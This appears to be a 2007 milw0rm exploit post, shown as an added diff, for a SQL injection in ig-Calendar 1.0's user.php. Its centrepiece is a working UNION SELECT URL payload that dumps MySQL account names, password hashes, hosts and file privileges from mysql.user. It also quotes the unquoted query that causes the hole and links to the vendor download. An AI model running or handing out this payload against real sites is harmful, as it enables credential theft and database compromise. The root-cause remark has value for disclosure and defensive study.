@@ -1,0 +1,13 @@
+SQL Injection in ig-Calendar.  This works regardless of magic_quotes_gpc!
+Dumps mysql login informaion:
+http://127.0.0.1/ig-calendar/user.php?id=999%20union%20select%201,User,Password,Host,File_priv,0%20from%20mysql.user
+./user.php line 52:
+$query = 'SELECT * FROM users WHERE id='.$id;
+Should have used quote marks.
+
+Vendor's page:http://www.igeneric.co.uk
+download: http://www.igeneric.co.uk/files/ig-calendar-1.0.zip
+
+By Michael Brooks.  
+
+# milw0rm.com [2007-01-05]
